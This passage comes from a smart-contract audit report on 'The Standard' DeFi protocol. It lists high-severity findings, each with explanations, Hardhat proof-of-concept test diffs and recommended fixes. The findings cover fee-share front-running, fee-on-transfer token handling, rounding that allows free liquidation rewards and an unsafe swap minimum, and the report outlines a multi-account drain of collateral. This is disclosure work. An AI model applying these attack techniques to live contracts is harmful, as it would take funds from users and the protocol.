      await user.sendTransaction({to: Vault.address, value: collateralPutUp});
      
      // @audit-info : set prices = 1 for easier calculations
      await ClEthUsd.setPrice(100000000);
      await ClEurUsd.setPrice(100000000);
      
      const { maxMintable } = await Vault.status();
      expect(maxMintable).to.equal(ethers.utils.parseEther('1.005'), 'maxMintable');

      const mintedValue = ethers.utils.parseEther('1');
      await Vault.connect(user).mint(user.address, mintedValue);
      expect(await Vault.undercollateralised()).to.equal(false);
      const { minted } = await Vault.status();
      expect(minted).to.equal(ethers.utils.parseEther('1.005'), "minted");
      
      // approve transfer to protocol
      await EUROs.connect(user).approve(Vault.address, ethers.utils.parseEther('1000'));

      // ****************************************** INTERMEDIATE SETUP STEPS *****************************************************
      // ******** let's use another account to credit `user` with some EUROs which can be used to pay burn-fee later *************
      await VaultManager.connect(otherUser).mint();
      const { status } = (await VaultManager.connect(otherUser).vaults())[0];
      const { vaultAddress } = status;
      const Vault2 = await ethers.getContractAt('SmartVaultV3', vaultAddress);
      await otherUser.sendTransaction({to: Vault2.address, value: ethers.utils.parseEther('99')});
      await Vault2.connect(otherUser).mint(user.address, ethers.utils.parseEther('50'));

      // @audit-info : `user` should now have 51 EUROs => 50 EUROs given by `otherUser` + 1 EUROs minted by `user` himself.
      expect(await EUROs.balanceOf(user.address)).to.equal(ethers.utils.parseEther('51')); 
      // ********************************* EUROs for burn-fee credited to `user` now *********************************************
      
      // @audit-info : `user` wants to burn all minted EUROs. But this time, he passes `amount + fairBurnFee` as param to the burn function.
      const burnedValue = ethers.utils.parseEther('1.005'); // amount + fairBurnFee
      burn = Vault.connect(user).burn(burnedValue);
      // @audit-info : Fee charged on top of this = 0.005 * 1.005 = 0.005025
      await expect(burn).to.emit(Vault, "EUROsBurned").withArgs(burnedValue, ethers.utils.parseEther('0.005025')); // paid more fee
      let [, updatedMinted2,,,,,,] = await Vault.status();
      
      // @audit-info : All burned now.
      expect(updatedMinted2).to.equal(ethers.utils.parseEther('0'), "afterBurningEverything");
    });
  });
```

## Impact
- User is forced to pay extra fee otherwise his capability to call other functions like `removeCollateral()` & `mint()` is unfairly limited.
- There is also some degree of risk that if the user does not notice the ever increasing value of `minted` after each mint() & burn() cycle of exact same amounts, then he may eventually get under-collateralized and be liquidated.

## Tools Used
Hardhat

## Recommendations
Multiple approaches can be taken to correct this, one of which could be:

```diff
-   function burn(uint256 _amount) external ifMinted(_amount) {
+   function burn(uint256 _amount) external {
        uint256 fee = _amount * ISmartVaultManagerV3(manager).burnFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
+       require(minted >= _amount + fee, "err-insuff-minted");
-       minted = minted - _amount;
+       minted = minted - _amount - fee;
        EUROs.burn(msg.sender, _amount);
        IERC20(address(EUROs)).safeTransferFrom(msg.sender, ISmartVaultManagerV3(manager).protocol(), fee);
        emit EUROsBurned(_amount, fee);
    }
```

## Important Considerations
Note that the in the above approach, mintFeeRate and burnFeeRate need to be equal - 
- If `mintFeeRate > burnFeeRate`, then the same problem occurs as above despite the fix, albeit at a slower pace.
- If `mintFeeRate < burnFeeRate`, then the above fix's `require` statement will revert and the user won't be able to burn all of his minted amount.

There are other ways to handle the scenario if the protocol wishes to have the liberty of setting mintFeeRate & burnFeeRate as different numbers. You may then _exclude_ `fee` from the `minted` calculation inside the `mint()` function but it has repurcussions across the protocol, such as while liquidating an underwater vault. These will have to be further examined.<br>
Constraining mintFeeRate & burnFeeRate to be equal seems to be the simpler solution.

---

### <a id="h-04"></a>[H-04]
## **Front-running allows holder to gain a share of fees**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L191
<br>

## Summary
When the protocol calculates the holders' and pendingStakes' eligible fee in [distributeFees()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L191), it does not consider _for how long_ has the `pendingStake` been in the system. Due to this -
- 1. A malicious user can monitor the mempool for any function call that generates a fee for the protocol, 
- 2. Front-run it to register a stake in the system via [increasePosition()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L134). This makes him eligible to get a share of the fee.
- 3. [decreasePosition()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L149) after 1 DAY and get back his staked amount + gained fee.

[LiquidationPool.sol#L191](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L191)
```js
    function distributeFees(uint256 _amount) external onlyManager {
        uint256 tstTotal = getTstTotal();
        if (tstTotal > 0) {
            IERC20(EUROs).safeTransferFrom(msg.sender, address(this), _amount);
            for (uint256 i = 0; i < holders.length; i++) {
                address _holder = holders[i];
                positions[_holder].EUROs += _amount * positions[_holder].TST / tstTotal;
            }
            for (uint256 i = 0; i < pendingStakes.length; i++) {
@---------->    pendingStakes[i].EUROs += _amount * pendingStakes[i].TST / tstTotal; // @audit : no consideration for the length of time this has been in pending
            }
        }
    }
```

**Root Cause:** The age of stakes are never considered in the protocol, apart from the distinction between confirmed & pending stake holders. This is problematic even in the normal course of events since this results in dilution of holders' stake by pendingStake holders (explained below).


## Vulnerability Details
Let us see an example for clarity:
- Let's start with no fee present in the system
- Alice stakes 100 TST at time `t + 0`
- Bob stakes 100 TST at time `t + 1.01 days`. _This could be under the normal flow of protocol usage OR could be a malicious front-running action._
- A fee of amount 500 EUROs is credited into the system via some fee-generating activity at time `t + 1.02 days`
- Alice is eligible for fee-share of $\frac {100} {(100 + 100)} * (50\% \text{ of } 500) = 0.5 * 250 = 125 \text{ EUROs}$
- Timestamp `t + 2.02 days` is reached
- Bob is eligible for the same fee-share of $125 \text{ EUROs}$ in spite of having staked just before the fee had come into the system. His action diluted Alice's share even though she had staked much earlier and was in essence a confirmed holder when the fee first came into the system.

## PoC
Patch the following diff inside `test/liquidationPool.js` and run via `npx hardhat test --grep 'allows front-running & fee collection'`. The test will pass all assertions.

```diff
diff --git a/test/liquidationPool.js b/test/liquidationPool_.js
index 8dd8580..ce984e2 100644
--- a/test/liquidationPool.js
+++ b/test/liquidationPool_.js
@@ -224,6 +224,44 @@ describe('LiquidationPool', async () => {
       expect(_position.EUROs).to.equal(distributedFees2);
     });
 
+    it('allows front-running & fee collection', async () => {
+      // some setup
+      const tstStake = ethers.utils.parseEther('100');
+      await TST.mint(user1.address, tstStake);
+      await TST.approve(LiquidationPool.address, tstStake);
+      await TST.mint(user2.address, tstStake);
+      await TST.connect(user2).approve(LiquidationPool.address, tstStake);
+      
+      // user1 stakes
+      await LiquidationPool.connect(user1).increasePosition(tstStake, 0);
+      await fastForward(DAY * 2);
+      
+      // *********** FRONT - RUNNING *******************
+      // @audit : user2 front-runs any `FEE-ACCUMULATING-ACTION` he sees in the mempool
+      await LiquidationPool.connect(user2).increasePosition(tstStake, 0);
+      // some fee gets accumulated
+      const fees = ethers.utils.parseEther('20');
+      await EUROs.mint(LiquidationPoolManager.address, fees);
+      // ************************************************
+
+      // @audit : user1 attempts to decrease his position and claim 50% of fee but fails
+      const user1_attempt1 = LiquidationPool.connect(user1).decreasePosition(tstStake, fees.div(2));
+      await expect(user1_attempt1).to.be.revertedWith("invalid-decr-amount");
+      // he can successfully claim 25% EUROs
+      const user1_attempt2 = await LiquidationPool.connect(user1).decreasePosition(tstStake, fees.div(4));
+      await expect(user1_attempt2).not.to.be.reverted;
+      
+      await fastForward(DAY);
+      // @audit : user2 claims his 25% EUROs
+      const user2_attempt = await LiquidationPool.connect(user2).decreasePosition(tstStake, fees.div(4));
+      await expect(user2_attempt).not.to.be.reverted;
+
+      expect(await TST.balanceOf(user1.address)).to.equal(tstStake, "user1 TST balance");
+      expect(await EUROs.balanceOf(user1.address)).to.equal(fees.div(4), "user1 EUROs balance");
+      expect(await TST.balanceOf(user2.address)).to.equal(tstStake, "user2 TST balance");
+      expect(await EUROs.balanceOf(user2.address)).to.equal(fees.div(4), "user2 EUROs balance");
+    });
+
     it('does not allow decreasing beyond position value, even with assets in pool', async () => {
       const tstStake1 = ethers.utils.parseEther('10000');
       await TST.mint(user1.address, tstStake1);
```

## Impact
- Malicious users are able to game the system and claim a portion of the holder fee.
- This dilutes the fee of a rightful holder who has staked for a longer duration. 
- Even considering the normal flow of events involving non-malicious users, we are diluting older user's fee-share if a newer user calls `increasePosition()` before a fee-generating action. This totally disregards the age of stakes.

## Tools Used
Hardhat

## Recommendations

### Style 1
The easiest way to remedy this would be -
- to have the function, `LiquidationPoolManager::distributeFees()` **_triggered every time any fee-generation activity credits_** `LiquidationPoolManager.sol` **_with EUROs_**. This would require EUROs (the fee-token) to be implemented as a token which supports callback, like an ERC-777 for example.
- then, we ought to modify `LiquidationPool::distributeFees()` like so:

```diff
    function distributeFees(uint256 _amount) external onlyManager {
+       consolidatePendingStakes();
+       // @audit : only allow non-pending holders' TST in the calculation to avoid malicious dilution of fee share
-       uint256 tstTotal = getTstTotal();
+       uint256 tstTotal = 0;
+       for (uint256 i = 0; i < holders.length; i++) {
+           tstTotal += positions[holders[i]].TST;
+       }
        if (tstTotal > 0) {
            IERC20(EUROs).safeTransferFrom(msg.sender, address(this), _amount);
            for (uint256 i = 0; i < holders.length; i++) {
                address _holder = holders[i];
                positions[_holder].EUROs += _amount * positions[_holder].TST / tstTotal;
            }
-           for (uint256 i = 0; i < pendingStakes.length; i++) {
-               pendingStakes[i].EUROs += _amount * pendingStakes[i].TST / tstTotal;
-           }
        }
    }
```

### Style 2
In case the protocol decides against having an ERC-777 style token, then another way to implement the fix would be to -
- track each fee-generating action's value and timestamp. 
- track each timestamp of _when_ the pendingStake got consolidated into a confirmed holder stake.
- Then, at the time of distributing fees, 
    - consolidatePendingStakes() 
    - compare the fee-timestamp and the confirmed holder stake conversion timestamp. Credit EUROs only if their difference is more than 1 DAY in the past. 
- This of course means that just like in the above style, while calculating `tstTotal`, we need to consider only eligible stakes' TST and not use `getTstTotal()`.

---

### <a id="h-05"></a>[H-05]
## **Tokens with a fee-on-transfer mechanism like PAXG, will break the protocol**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L232
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L175
<br>

## Summary & Vulnerability Details
The Protocol is incompatible with tokens that have a fee-on-transfer mechanism. Such tokens for example are [PAXG](https://arbiscan.io/token/0xfeb4dfc8c4cf7ed305bb08065d08ec6ee6728429) **_(officially supported [as per documentation](https://www.codehawks.com/contests/clql6lvyu0001mnje1xpqcuvl))_**, while USDT has a built-in fee-on-transfer mechanism that is currently switched off.<br>

One example of such code is in `distributeAssets()` while using `safeTransferFrom()` _([L232](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L232))_. This will work incorrectly if the token has a fee-on-transfer mechanism due to following sequence of events - 
- 1. The `rewards` will be calculated based on the variable `_portion` on [L227](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L227). 
- 2. However, the amount which is added to the contract via `safeTransferFrom` will only be `_portion - fee` on [L232](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L232). 
- 3. Since now the funds in the contract are less than the sum of all rewards (less than the sum of all `_portions`), the first few users calling [claimRewards](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L175) _may_ receive their full reward, but eventually subsequent users' call will start reverting due to insufficient funds.
- 4. Also an additional note: When [L175](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L175) makes the transfer of reward to the user, the user will actually only receive `_rewardAmount - fee`, but I think that can be signed off to as an acceptable effect/risk of using fee-on-transfer tokens. 

[LiquidationPool.sol#L232](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L232)
```js
    function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external payable {
        consolidatePendingStakes();
        (,int256 priceEurUsd,,,) = Chainlink.AggregatorV3Interface(eurUsd).latestRoundData();
        uint256 stakeTotal = getStakeTotal();
        uint256 burnEuros;
        uint256 nativePurchased;
        for (uint256 j = 0; j < holders.length; j++) {
            Position memory _position = positions[holders[j]];
            uint256 _positionStake = stake(_position);
            if (_positionStake > 0) {
                for (uint256 i = 0; i < _assets.length; i++) {
                    ILiquidationPoolManager.Asset memory asset = _assets[i];
                    if (asset.amount > 0) {
                        (,int256 assetPriceUsd,,,) = Chainlink.AggregatorV3Interface(asset.token.clAddr).latestRoundData();
                        uint256 _portion = asset.amount * _positionStake / stakeTotal;
                        uint256 costInEuros = _portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) / uint256(priceEurUsd)
                            * _hundredPC / _collateralRate;
                        if (costInEuros > _position.EUROs) {
                            _portion = _portion * _position.EUROs / costInEuros;
                            costInEuros = _position.EUROs;
                        }
                        _position.EUROs -= costInEuros;
@------------------->   rewards[abi.encodePacked(_position.holder, asset.token.symbol)] += _portion;
                        burnEuros += costInEuros;
                        if (asset.token.addr == address(0)) {
                            nativePurchased += _portion;
                        } else {
@------------------->       IERC20(asset.token.addr).safeTransferFrom(manager, address(this), _portion);
                        }
                    }
                }
            }
            positions[holders[j]] = _position;
        }
        if (burnEuros > 0) IEUROs(EUROs).burn(address(this), burnEuros);
        returnUnpurchasedNative(_assets, nativePurchased);
    }
```

[LiquidationPool.sol#L175)](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L175)
```js
    function claimRewards() external {
        ITokenManager.Token[] memory _tokens = ITokenManager(tokenManager).getAcceptedTokens();
        for (uint256 i = 0; i < _tokens.length; i++) {
            ITokenManager.Token memory _token = _tokens[i];
            uint256 _rewardAmount = rewards[abi.encodePacked(msg.sender, _token.symbol)];
            if (_rewardAmount > 0) {
                delete rewards[abi.encodePacked(msg.sender, _token.symbol)];
                if (_token.addr == address(0)) {
                    (bool _sent,) = payable(msg.sender).call{value: _rewardAmount}("");
                    require(_sent);
                } else {
@------------->     IERC20(_token.addr).transfer(msg.sender, _rewardAmount);
                }   
            }

        }
    }
```

## Impact
- Users unable to claim their reward
    - Impact: High, as some users will lose value
    - Likelihood: High, as such tokens (example: [PAXG](https://arbiscan.io/token/0xfeb4dfc8c4cf7ed305bb08065d08ec6ee6728429)) are officially supported currently [as per documentation](https://www.codehawks.com/contests/clql6lvyu0001mnje1xpqcuvl)

## Tools Used
Manual inspection

## Recommendations
- Cache the balance before a `transferFrom / transfer` to the contract and then check it after the transfer and use the difference between them as the newly added balance. 
    - In our context, it basically means that the `_portion` variable needs to be decreased by the token-transfer-fee before adding it to the `rewards[]` variable.
- Also best to implement a `nonReentrant` modifier, as otherwise `ERC777` tokens may manipulate this. 

---

### <a id="h-06"></a>[H-06]
## **Liquidation rewards can be gained without paying any EUROs**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L219-L221
<br>

## Summary & Vulnerability Details
[distributeAssets()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L219-L221) calculates `_portion` and then the `costInEuros`, which is the amount in EUROs the liquidator has to pay in exchange for the `rewards` or the collateral he helped liquidate. There are 2 issues with the following line of code which allows a liquidator to get 1 wei of collateral by paying 0 EUROs:
```js
uint256 costInEuros = _portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) / uint256(priceEurUsd)
    * _hundredPC / _collateralRate;
```

The complete function is as below:<br>
[LiquidationPool.sol#L219-L221](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L219-L221)
```js
    function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external payable {
        consolidatePendingStakes();
        (,int256 priceEurUsd,,,) = Chainlink.AggregatorV3Interface(eurUsd).latestRoundData();
        uint256 stakeTotal = getStakeTotal();
        uint256 burnEuros;
        uint256 nativePurchased;
        for (uint256 j = 0; j < holders.length; j++) {
            Position memory _position = positions[holders[j]];
            uint256 _positionStake = stake(_position);
            if (_positionStake > 0) {
                for (uint256 i = 0; i < _assets.length; i++) {
                    ILiquidationPoolManager.Asset memory asset = _assets[i];
                    if (asset.amount > 0) {
                        (,int256 assetPriceUsd,,,) = Chainlink.AggregatorV3Interface(asset.token.clAddr).latestRoundData();
@------------------->   uint256 _portion = asset.amount * _positionStake / stakeTotal;
@------------------->   uint256 costInEuros = _portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) / uint256(priceEurUsd)
                            * _hundredPC / _collateralRate;
                        if (costInEuros > _position.EUROs) {
                            _portion = _portion * _position.EUROs / costInEuros;
                            costInEuros = _position.EUROs;
                        }
                        _position.EUROs -= costInEuros;
                        rewards[abi.encodePacked(_position.holder, asset.token.symbol)] += _portion;
                        burnEuros += costInEuros;
                        if (asset.token.addr == address(0)) {
                            nativePurchased += _portion;
                        } else {
                            IERC20(asset.token.addr).safeTransferFrom(manager, address(this), _portion);
                        }
                    }
                }
            }
            positions[holders[j]] = _position;
        }
        if (burnEuros > 0) IEUROs(EUROs).burn(address(this), burnEuros);
        returnUnpurchasedNative(_assets, nativePurchased);
    }
```

### Issue-1:
**Division before multiplication causes precision loss** and hence liquidator can get away with paying nothing & still receive reward. Here's an example:
- Let's consider [ARB](https://arbiscan.io/address/0x912ce59144191c1204e64559fe8253a0e49e6548#readProxyContract) token which is officially supported by the protocol as an acceptable collateral. It has 18 decimal places.
- It's [Chainlink price feed](https://arbiscan.io/address/0xb2a824043730fe05f3da2efafa1cbbe83fa548d6#readContract) puts the price at around $191650000$ (`1 ARB = 1.9165 USD`)
- Let's suppose `_portion` to be equal to $1$.
- Chainlink price for EUR/USD pair has been taken in the tests as $106000000$ (`1 EUR = 1.06 USD`), so let's stick with that.
- Then, `costInEuros` will be calculated by the protocol on [L220](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol#L220) as:
$$
\begin{equation}
\begin{split}   costInEuros &= \_portion * {10} ^ {(18 - asset.token.dec)} * uint256(assetPriceUsd) / uint256(priceEurUsd) * \_hundredPC / \_collateralRate \\
                &= 1 * {10} ^ {(18 - 18)} * 191650000 / 106000000 * 100000 / 120000 \\
                &= 191650000 / 106000000 * 100000 / 120000 \\
                &= 1 * 100000 / 120000 \\
                &= 100000 / 120000 \\
                &= 0
\end{split}
\end{equation}
$$

One would imagine that doing all the multiplications before divisions would be a good fix. Let's check that:
$$
\begin{equation}
\begin{split}   costInEuros &= \_portion * {10} ^ {(18 - asset.token.dec)} * uint256(assetPriceUsd) * \_hundredPC / (uint256(priceEurUsd) * \_collateralRate) \\
                &= 1 * {10} ^ {(18 - 18)} * 191650000 * 100000 / (106000000 * 120000) \\
                &= 191650000 * 100000 / (106000000 * 120000) \\
                &= 19165000000000 / 12720000000000 \\
                &= 1
\end{split}
\end{equation}
$$

However, this is still incomplete and brings us to the $2^{nd}$ issue:

### Issue-2:
- Imagine a price fluctuation such that `1 ARB < 1 EUR`. This could easily happen in the above scenario with EUR/USD moving up, or ARB/USD moving down. Or, you can suppose an altogether different token which has price less than that of EUR. Then, **due to `costInEuros` being rounded down instead of being rounded up, liquidator will get the reward for free**.
- Let's say `1 ARB = 1.059 USD` or $105900000$. Then -
$$
\begin{equation}
\begin{split}   costInEuros &= \_portion * {10} ^ {(18 - asset.token.dec)} * uint256(assetPriceUsd) * \_hundredPC / (uint256(priceEurUsd) * \_collateralRate) \\
                &= 1 * {10} ^ {(18 - 18)} * 105900000 * 100000 / (106000000 * 120000) \\
                &= 105900000 * 100000 / (106000000 * 120000) \\
                &= 10590000000000 / 12720000000000 \\
                &= 0
\end{split}
\end{equation}
$$

Hence the above should have been rounded up by using an external library like [solmate](https://github.com/transmissions11/solmate) which has the function [mulDivUp](https://github.com/transmissions11/solmate/blob/main/src/utils/FixedPointMathLib.sol#L53) or use custom logic as mentioned in the _recommendation_ section below.

<br><br>

**_NOTE_** that the above vulnerability can be used to get free rewards of more than $1 \text{ wei}$ by mounting an attack vector which uses multiple accounts causing `_portion` to calculate as 1. Consider the following scenario showcasing an attack scenario which will drain all `ARB` collateral while paying nothing:
- Malicious liquidator stakes TST & EUROs from 100 different accounts, each account staking $= (1, 1)$.
- `ARB` collateral to be liquidated $= 100$
- For each account (holder), `_portion` calculated as $\text{ } asset.amount * \_positionStake / stakeTotal => 100 * 1 / 100 => 1$ which is credited to the account holder.
- Combined rewards from all accounts = $100$, with $0$ EUROs paid.

## PoC
Use the following patch to add the test to `test/liquidationPoolManager.js` and run via `npx hardhat test --grep 'free liquidation gain'` to see it pass. <br>
In this test since there is only 1 holder, and `ARB` collateral to be liquated is 1, `_portion` will calculate to 1 just as in the above examples and result in "free liquidation":

```diff
diff --git a/test/liquidationPoolManager.js b/test/liquidationPoolManager_2.js
index 7e0f5c2..5b05cf9 100644
--- a/test/liquidationPoolManager.js
+++ b/test/liquidationPoolManager_2.js
@@ -160,6 +160,37 @@ describe('LiquidationPoolManager', async () => {
       await expect(LiquidationPoolManager.runLiquidation(TOKEN_ID)).to.be.revertedWith('vault-not-undercollateralised');
     });
 
+    it('free liquidation gain', async () => {
+      ARB = await ERC20MockFactory.deploy('Arbitrum', 'ARB', 18)
+      const ArbUsd = await (await ethers.getContractFactory('ChainlinkMock')).deploy('ARB/USD');
+      await ArbUsd.setPrice(191650000);
+      await TokenManager.addAcceptedToken(ARB.address, ArbUsd.address);
+
+      const arbCollateral = 1;
+
+      // create some funds to be "liquidated"
+      await ARB.mint(SmartVaultManager.address, arbCollateral);
+
+      const tstStake1 = ethers.utils.parseEther('1000');
+      const initialEURObalance = ethers.utils.parseEther('2000');
+      const eurosStake1 = initialEURObalance;
+      await TST.mint(holder1.address, tstStake1);
+      await EUROs.mint(holder1.address, eurosStake1);
+      await TST.connect(holder1).approve(LiquidationPool.address, tstStake1);
+      await EUROs.connect(holder1).approve(LiquidationPool.address, eurosStake1);
+      await LiquidationPool.connect(holder1).increasePosition(tstStake1, eurosStake1);
+      let { _rewards, _position } = await LiquidationPool.position(holder1.address);
+      expect(_position.EUROs).to.equal(eurosStake1);
+      
+      await fastForward(DAY);
+      await LiquidationPoolManager.runLiquidation(TOKEN_ID);
+      expect(await ARB.balanceOf(LiquidationPool.address)).to.equal(arbCollateral);
+      
+      ({ _rewards, _position } = await LiquidationPool.position(holder1.address));
+      expect(_position.EUROs).to.equal(initialEURObalance); // @audit-info : no EUROs paid by liquidator
+      expect(rewardAmountForAsset(_rewards, 'ARB')).to.equal(arbCollateral); // @audit-info : received the collateral
+    });
+
     it('distributes liquidated assets among stake holders if there is enough EUROs to purchase', async () => {
       const ethCollateral = ethers.utils.parseEther('0.5');
       const wbtcCollateral = BigNumber.from(1_000_000);
```

## Impact
- Liquidator gaining rewards while paying no EUROs; fund loss to the protocol.

## Tools Used
Hardhat

## Recommendations
Round up `costInEuros` by using an external library like [solmate](https://github.com/transmissions11/solmate) which has the function [mulDivUp](https://github.com/transmissions11/solmate/blob/main/src/utils/FixedPointMathLib.sol#L53) or use custom logic as mentioned below:

```diff
    function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external payable {
        consolidatePendingStakes();
        (,int256 priceEurUsd,,,) = Chainlink.AggregatorV3Interface(eurUsd).latestRoundData();
        uint256 stakeTotal = getStakeTotal();
        uint256 burnEuros;
        uint256 nativePurchased;
        for (uint256 j = 0; j < holders.length; j++) {
            Position memory _position = positions[holders[j]];
            uint256 _positionStake = stake(_position);
            if (_positionStake > 0) {
                for (uint256 i = 0; i < _assets.length; i++) {
                    ILiquidationPoolManager.Asset memory asset = _assets[i];
                    if (asset.amount > 0) {
                        (,int256 assetPriceUsd,,,) = Chainlink.AggregatorV3Interface(asset.token.clAddr).latestRoundData();
                        uint256 _portion = asset.amount * _positionStake / stakeTotal;
-                       uint256 costInEuros = _portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) / uint256(priceEurUsd)
-                           * _hundredPC / _collateralRate;
+                       uint256 costInEuros = (_portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) * _hundredPC) / (uint256(priceEurUsd) * _collateralRate); // @audit : multiply before dividing
+                       if (costInEuros * uint256(priceEurUsd) * _collateralRate < _portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) * _hundredPC) costInEuros++; // @audit : round-up
                        if (costInEuros > _position.EUROs) {
                            _portion = _portion * _position.EUROs / costInEuros;
                            costInEuros = _position.EUROs;
                        }
                        _position.EUROs -= costInEuros;
                        rewards[abi.encodePacked(_position.holder, asset.token.symbol)] += _portion;
                        burnEuros += costInEuros;
                        if (asset.token.addr == address(0)) {
                            nativePurchased += _portion;
                        } else {
                            IERC20(asset.token.addr).safeTransferFrom(manager, address(this), _portion);
                        }
                    }
                }
            }
            positions[holders[j]] = _position;
        }
        if (burnEuros > 0) IEUROs(EUROs).burn(address(this), burnEuros);
        returnUnpurchasedNative(_assets, nativePurchased);
    }
```

---

### <a id="h-07"></a>[H-07]
## **User can get liquidated due to incorrect calculateMinimumAmountOut()**
#### https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L206-L212
<br>

## Summary
[calculateMinimumAmountOut()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L206-L212) calculations are prone to rounding-down error (almost every time). This means a user calling [swap](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L225) will be undercollateralized if he receives this function's returned value (later being set as the `amountOutMinimum` inside `ISwapRouter.ExactInputSingleParams`), as the swap's `amountOut`. He can be immediately liquidated and the user unfairly loses his assets. <br>
The code should have checked at the end of the function whether the returned value will cause the vault to be undercollateralized.

[SmartVaultV3.sol::calculateMinimumAmountOut()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L206-L212)
```js
    function calculateMinimumAmountOut(bytes32 _inTokenSymbol, bytes32 _outTokenSymbol, uint256 _amount) private view returns (uint256) {
        ISmartVaultManagerV3 _manager = ISmartVaultManagerV3(manager);
        uint256 requiredCollateralValue = minted * _manager.collateralRate() / _manager.HUNDRED_PC();                         <---------------- @audit : rounding error here.
        uint256 collateralValueMinusSwapValue = euroCollateral() - calculator.tokenToEur(getToken(_inTokenSymbol), _amount);
        return collateralValueMinusSwapValue >= requiredCollateralValue ?
            0 : calculator.eurToToken(getToken(_outTokenSymbol), requiredCollateralValue - collateralValueMinusSwapValue);    <---------------- @audit : missing a check here.
    }
```

[SmartVaultV3.sol::swap()](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol#L225)
```js
    function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external onlyOwner {
        uint256 swapFee = _amount * ISmartVaultManagerV3(manager).swapFeeRate() / ISmartVaultManagerV3(manager).HUNDRED_PC();
        address inToken = getSwapAddressFor(_inToken);
@---->  uint256 minimumAmountOut = calculateMinimumAmountOut(_inToken, _outToken, _amount);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
                tokenIn: inToken,
                tokenOut: getSwapAddressFor(_outToken),
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: _amount - swapFee,
@-------->      amountOutMinimum: minimumAmountOut,
                sqrtPriceLimitX96: 0
            });
        inToken == ISmartVaultManagerV3(manager).weth() ?
            executeNativeSwapAndFee(params, swapFee) :
            executeERC20SwapAndFee(params, swapFee);
    }
```

## PoC
We will pick up the example from the [pre-existing unit test](https://github.com/Cyfrin/2023-12-the-standard/blob/main/test/smartVault.js#L345) `invokes swaprouter with value for eth swap, paying fees to protocol`, so that it's simpler to demonstrate. Apply the following patch to add steps to the test. Minor changes have also been made to `SmartVault3.sol` to enable logging inside the test:

```diff
diff --git a/contracts/SmartVaultV3.sol b/contracts/SmartVaultV3.sol
index fdc492d..7296c73 100644
--- a/contracts/SmartVaultV3.sol
+++ b/contracts/SmartVaultV3.sol
@@ -24,7 +24,7 @@ contract SmartVaultV3 is ISmartVault {
     IPriceCalculator public immutable calculator;
 
     address public owner;
-    uint256 private minted;
+    uint256 public minted;
     bool private liquidated;
 
     event CollateralRemoved(bytes32 symbol, uint256 amount, address to);
@@ -72,7 +72,7 @@ contract SmartVaultV3 is ISmartVault {
         }
     }
 
-    function maxMintable() private view returns (uint256) {
+    function maxMintable() public view returns (uint256) {
         return euroCollateral() * ISmartVaultManagerV3(manager).HUNDRED_PC() / ISmartVaultManagerV3(manager).collateralRate();
     }
 
diff --git a/test/smartVault.js b/test/smartVault.js
index 464b603..f9e39e2 100644
--- a/test/smartVault.js
+++ b/test/smartVault.js
@@ -348,17 +348,20 @@ describe('SmartVault', async () => {
       // user borrows 1200 EUROs
       const borrowValue = ethers.utils.parseEther('1200');
       await Vault.connect(user).mint(user.address, borrowValue);
+      console.log("Before Swap: is undercollateralized: %s, minted: %s, maxMintable: %s", await Vault.undercollateralised(), await Vault.minted(), await Vault.maxMintable());
+      expect(await Vault.undercollateralised()).to.eq(false);
+
       const inToken = ethers.utils.formatBytes32String('ETH');
       const outToken = ethers.utils.formatBytes32String('sUSD');
       // user is swapping .5 ETH
       const swapValue = ethers.utils.parseEther('0.5');
       const swapFee = swapValue.mul(PROTOCOL_FEE_RATE).div(HUNDRED_PC);
       // minimum collateral after swap must be €1200 (borrowed) + €6 (fee) * 1.2 (rate) = €1447.2
-      // remaining collateral not swapped: .5 ETH * $1600 = $800 = $800 / 1.06 = €754.72
-      // swap must receive at least €1320 - €754.72 = €692.48 = $734.032;
+      // remaining collateral not swapped: (1 - .5) ETH * $1600 = $800 = $800 / 1.06 = €754.72
